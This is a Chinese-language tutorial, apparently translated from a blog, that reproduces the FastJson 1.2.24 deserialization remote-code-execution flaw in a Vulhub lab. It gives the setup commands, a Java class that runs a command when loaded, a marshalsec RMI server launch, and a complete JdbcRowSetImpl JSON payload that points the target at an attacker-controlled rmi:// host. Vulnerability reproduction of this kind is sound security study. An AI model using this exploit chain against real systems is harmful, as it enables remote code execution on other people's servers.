# FastJson_1.2.24 反序列化漏洞复现+解析
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
概述：本文从复现与调试分析两个方向简述了此漏洞，逐步跟踪漏洞执行流程。  
漏洞的复现与调试分析采用了两套环境  
复现：Windows+WSL_Ubuntu18.04+Vulhub  
调试分析：Windows+IDEA+WSL_Ubuntu18.04
## 漏洞复现
###  使用VulHub-Docker 环境
采用 VulHub 中的FastJson 1.2.24-RCE 集成式Docker环境
此处需要用到一些其他知识：
  * [git 基础命令](https://blog.csdn.net/MZLI_L/article/details/116199137?spm=1001.2014.3001.5501 "git 基础命令")
  * [docker/docker-compose 基础命令](https://blog.csdn.net/MZLI_L/article/details/116199173?spm=1001.2014.3001.5501 "docker/docker-compose 基础命令")
  * [curl 基础命令](https://blog.csdn.net/MZLI_L/article/details/116199232?spm=1001.2014.3001.5501 "curl 基础命令")
VulHub 下载命令：
  * `GitHub：git clone https://github.com/vulhub/vulhub.git`
  * `Gitee：git clone https://gitee.com/Plastilina/vulhub.git`
下载完成后进入相关漏洞环境目录  
此处为：`/vulhub/fastjson/1.2.24-rce`  
目录下具有`docker-compose.yml`文件，为`docker compose`的配置文件，通过此文件构建一个具有`FastJson
1.2.24-RCE`漏洞的`Docker`容器  
构建命令：`docker-compose build`  
启动命令：`docker-compose up -d`  
停止命令：`docker-compose down`  
进入docker容器命令：
  * 使用`docker ps`获取对应容器的`CONTAINER ID`  
  * 进入docker容器  
`docker exec -it  /bin/bash`
检测是否正常使用：在本机运行`curl http://127.0.0.1：8090`  
出现下图信息，表示正常运行：
###  构建恶意访问请求Payload
注意：此文件构建在另一主机上
此处需要使用到的其他知识：
  * [javac 基础命令](https://blog.csdn.net/MZLI_L/article/details/116199335?spm=1001.2014.3001.5501 "javac 基础命令")
创建`TouchFile.java`文件  
拷贝如下代码
    // javac TouchFile.java
    import java.lang.Runtime;
    import java.lang.Process;
    public class TouchFile {
        static {
            try {
                Runtime rt = Runtime.getRuntime();
                String[] commands = {"touch", "/tmp/success"};
                # Windows
                # String[] commands = {"notepad.exe"};
                Process pc = rt.exec(commands);
                pc.waitFor();
            } catch (Exception e) {
                // do nothing
            }
        }
    }
执行编译命令，生成class文件  
`javac TouchFile.java`
###  使用python 创建简易文件服务器
注意：此文件服务器不与目标机同一机器上
命令行模式下`cd`到构建了恶意payload文件目录下  
执行命令：`python -m http.server [port]`
例：`python -m http.server 1111`  
出现下图所示表示成功：
此时在目标主机应该可以访问到此目录下的文件  
在目标主机执行命令  
`curl http://:1111`
返回的数据中应有如下类似数据
###  使用marshalsec 创建恶意RMI服务
注意：此RMI服务不在目标主机上，在搭建了文件服务器的主机上。  
（当然，它也可以在其他机器中，只要各个机器可以互相访问）
**RMI:** Remote Method Invocation，远程方法调用。RMI服务器类似以前的电话转接员，用于转接服务器的特定请求。
此处需要用到一些其他知识：
  * [java 基础命令](https://blog.csdn.net/MZLI_L/article/details/116199335?spm=1001.2014.3001.5501 "java 基础命令")
  * [maven 基础命令](https://blog.csdn.net/MZLI_L/article/details/116199478?spm=1001.2014.3001.5501 "maven 基础命令")
下载`marshalsec`  
`Github:git clone https://github.com/mbechler/marshalsec.git`  
`Gitee:git clone https://gitee.com/Plastilina/marshalsec.git`
下载完成后进入`marshalsec`目录，其中有一个`pom.xml`文件，这是一个`maven`的项目构建文件
使用`maven`构建项目：`mvn compile`  
构建完成后，在该目录下会有一个`target`目录，内含构建好的jar包  
我们需要使用的为`marshalsec-0.0.3-SNAPSHOT-all.jar`
也可以直接下载编译完成的jar包  
链接：`Gitee: git clone https://gitee.com/Plastilina/marshalsec-jar.git`
然后进入jar包所在文件执行命令：  
`java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer
 `
例：`java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer
"http://192.168.192.113:8000" 9999`
###  攻击
注：下列操作皆在恶意主机中执行。
启动`BurpSuite`,创建一个`Repeader`,host、端口指向目标机，当然也可以直接使用`Curl`  
拷贝如下代码：
    # BurpSuite
    POST / HTTP/1.1
    Host: 目标机器:8090
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/json
    Content-Length: 160
    {
        "b":{
            "@type":"com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName":"rmi://恶意主机IP:9999/TouchFile",
            "autoCommit":true
        }
    }